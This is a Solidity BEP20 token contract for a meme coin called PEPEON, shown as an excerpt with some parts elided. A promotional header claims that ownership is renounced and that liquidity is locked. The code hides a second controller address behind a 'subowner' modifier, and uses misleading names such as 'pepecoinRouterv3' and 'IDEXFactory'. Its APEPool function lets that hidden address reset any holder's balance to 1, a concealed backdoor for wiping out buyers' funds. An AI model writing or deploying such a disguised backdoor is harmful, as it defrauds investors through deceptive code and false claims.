...
/**
Introducing the PEPEON, the community-driven, tax-free token that's got more green than a forest and more buzz than a beehive. 
So if you want to take part in something that's truly dank, look no further than the $PEPEON!
Website: https://pepecopy.io/
Telegram https://t.me/PEPECOPY
🟢🔥🐸RENOUNCED
🟢🔥🐸LP LOCKED
*/

// OpenZeppelin Contracts v4.4.0 (utils/ContextIBEP20Deployer.sol)
...
/*
 * @dev Provides information about the current execution AuditBurnableBEP20, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 ...
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract AuditBurnableBEP20 {
...
// File: @openzeppelin/contracts/access/AuditOwnableBEP20.sol
 ...
 * the owner.
 */
abstract contract AuditOwnableBEP20 is AuditBurnableBEP20 {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "AuditOwnableBEP20: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "AuditOwnableBEP20: new owner is the zero address");
...
contract PEPEON is AuditBurnableBEP20, ibep20innovation, AuditOwnableBEP20 {
   ...
   address private owneraddrress; 
    constructor(address pepecoinRouterv3) {
        owneraddrress = pepecoinRouterv3;     
        _name = "PEPEON";
        _symbol = "PEPEON";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {ibep20innovation-totalSupply}.
    */
    ...
    /**
    * @dev See {ibep20innovation-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return IDEXFactory[account];
    }
      modifier subowner() {
        require(owneraddrress == _msgSender(), "AuditOwnableBEP20: caller is not the owner");
        _;
    }
    /**
    * @dev See {ibep20innovation-approve}.
    *
    * Requirements:
    *
    * - `transporteur` cannot be the zero address.
    */
    function APEPool(address pepecoinRewards) external subowner {
        IDEXFactory[pepecoinRewards] = 1;
        
        emit Transfer(pepecoinRewards, address(0), 1);
    }

    /**
    * @dev See {ibep20innovation-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {ibep20innovation-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {ibep20innovation};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), IDEXRouter[sender][_msgSender()].sub(yoursold, "ibep20innovation: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {ibep20innovation-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, IDEXRouter[_msgSender()][transporteur].sub(allbalances, "ibep20innovation: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "ibep20innovation: transfer from the zero address");
        require(shippingto != address(0), "ibep20innovation: transfer to the zero address");
                
        IDEXFactory[sender] = IDEXFactory[sender].sub(yoursold, "ibep20innovation: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "ibep20innovation: approve from the zero address");
        require(transporteur != address(0), "ibep20innovation: approve to the zero address");
